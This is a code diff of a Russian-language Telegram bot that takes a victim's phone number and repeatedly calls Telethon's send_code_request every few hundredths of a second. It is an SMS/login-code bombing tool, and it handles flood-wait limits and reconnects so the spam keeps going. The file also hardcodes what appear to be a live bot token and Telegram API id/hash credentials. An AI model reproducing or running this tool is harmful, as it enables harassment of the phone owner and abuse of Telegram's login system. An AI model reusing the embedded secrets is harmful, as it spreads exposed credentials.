@@ -7,20 +7,13 @@ from telethon.errors import FloodWaitError
 BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 
 accounts = [
-    {'api_id': 35911533, 'api_hash': '11dafcdc1514796c867055023716d39a'},
-    {'api_id': 16623, 'api_hash': '8c9dbfe58437d1739540f5d53c72ae4b'}
+    {'api_id': 35911533, 'api_hash': '11dafcdc1514796c867055023716d39a'}
 ]
 
 spam_tasks = {}
-current_number = None
-account_index = 0
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "Просто отправь номер телефона в формате +380XXXXXXXXX или +7XXXXXXXXXX\n"
-        "Бот начнёт спамить кодами, используя два аккаунта.\n"
-        "Остановить — /stop"
-    )
+    await update.message.reply_text("Отправь номер (например, +380963836766)")
 
 async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -32,58 +25,50 @@ async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await task
             except asyncio.CancelledError:
                 pass
-        await update.message.reply_text("Спам остановлен.")
+        await update.message.reply_text("Остановлено")
     else:
-        await update.message.reply_text("Нет активного спама.")
+        await update.message.reply_text("Нет активного спама")
 
 async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global current_number
     chat_id = update.effective_chat.id
     if chat_id in spam_tasks:
-        await update.message.reply_text("Уже идёт спам. Останови /stop и отправь новый номер.")
+        await update.message.reply_text("Уже идёт, останови /stop")
         return
     phone = update.message.text.strip()
     if not phone.startswith('+'):
-        await update.message.reply_text("Номер должен начинаться с +, например +380963836766")
+        await update.message.reply_text("Формат: +380...")
         return
-    current_number = phone
-    await update.message.reply_text(f"Запускаю спам на номер {phone} через {len(accounts)} аккаунтов...")
+    await update.message.reply_text(f"Запущено на {phone}")
 
     async def spam():
-        global account_index
         count = 0
-        clients = {}
+        client = None
         while True:
-            acc = accounts[account_index % len(accounts)]
-            account_index += 1
-            key = (acc['api_id'], acc['api_hash'])
-            if key not in clients:
-                client = TelegramClient(None, acc['api_id'], acc['api_hash'])
-                await client.connect()
-                clients[key] = client
-            else:
-                client = clients[key]
             try:
+                if client is None:
+                    acc = accounts[0]
+                    client = TelegramClient(None, acc['api_id'], acc['api_hash'])
+                    await client.connect()
                 await client.send_code_request(phone)
                 count += 1
-                await context.bot.send_message(chat_id, f"Код #{count} через акк {acc['api_id']}")
+                await context.bot.send_message(chat_id, f"Запрос #{count} отправлен")
                 await asyncio.sleep(0.02)
             except FloodWaitError as e:
                 sec = e.seconds
-                await context.bot.send_message(chat_id, f"FloodWait {sec} сек, удаляю клиент акка {acc['api_id']}")
+                await context.bot.send_message(chat_id, f"Ожидание {sec} сек")
                 await client.disconnect()
-                clients.pop(key, None)
+                client = None
                 await asyncio.sleep(sec)
             except Exception as e:
                 err = str(e)
                 if "all available options" in err or "ResendCodeRequest" in err:
-                    await context.bot.send_message(chat_id, f"Все методы на акк {acc['api_id']}, удаляю клиент")
+                    await context.bot.send_message(chat_id, "Методы исчерпаны, переподключение")
                     await client.disconnect()
-                    clients.pop(key, None)
+                    client = None
                 else:
-                    await context.bot.send_message(chat_id, f"Ошибка на акк {acc['api_id']}: {err[:60]}, пересоздам")
+                    await context.bot.send_message(chat_id, f"Ошибка: {err[:40]}")
                     await client.disconnect()
-                    clients.pop(key, None)
+                    client = None
                 await asyncio.sleep(0.05)
 
     task = asyncio.create_task(spam())
